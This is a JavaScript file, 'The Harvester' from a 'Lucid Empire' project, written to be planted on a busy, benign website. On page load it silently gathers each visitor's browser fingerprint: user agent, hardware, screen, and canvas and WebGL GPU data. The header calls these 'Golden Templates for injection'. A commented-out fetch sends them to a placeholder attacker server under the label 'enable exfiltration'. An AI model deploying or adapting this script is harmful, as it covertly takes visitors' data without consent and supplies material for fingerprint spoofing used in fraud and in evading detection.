/**
PROJECT LUCID EMPIRE :: THE HARVESTER
Purpose: Embed this script on a high-traffic, benign website to harvest
real, organic fingerprints ("Golden Templates") for injection.

Data Collected:
Canvas Data URL (Hash)
WebGL Renderer String
AudioContext Oscillator Node
Screen Resolution & Depth
Navigator Properties (UA, HardwareConcurrency, DeviceMemory)
*/
(function() {
const SERVER_ENDPOINT = "http://YOUR_LUCID_SERVER/api/harvest";
async function collectFingerprint() {
    const fp = {};

    // 1. BASIC NAVIGATOR
    fp.ua = navigator.userAgent;
    fp.platform = navigator.platform;
    fp.cores = navigator.hardwareConcurrency;
    fp.memory = navigator.deviceMemory;
    fp.screen = {
        width: screen.width,
        height: screen.height,
        depth: screen.colorDepth
    };

    // 2. CANVAS FINGERPRINT (The Image)
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.textBaseline = "alphabetic";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = "#069";
    ctx.fillText("LUCID_EMPIRE", 2, 15);
    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
    ctx.fillText("LUCID_EMPIRE", 4, 17);
    fp.canvas_hash = canvas.toDataURL();

    // 3. WEBGL RENDERER (The GPU)
    const gl = document.createElement('canvas').getContext('webgl');
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    fp.gpu_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    fp.gpu_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

    // 4. SEND TO MOTHERSHIP
    console.log("[HARVESTER] Template Captured:", fp);
    
    // Uncomment to enable exfiltration
    /*
    fetch(SERVER_ENDPOINT, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(fp)
    });
    */
}

// Execute silently on load
if (document.readyState === "complete") {
    collectFingerprint();
} else {
    window.addEventListener("load", collectFingerprint);
}
})();
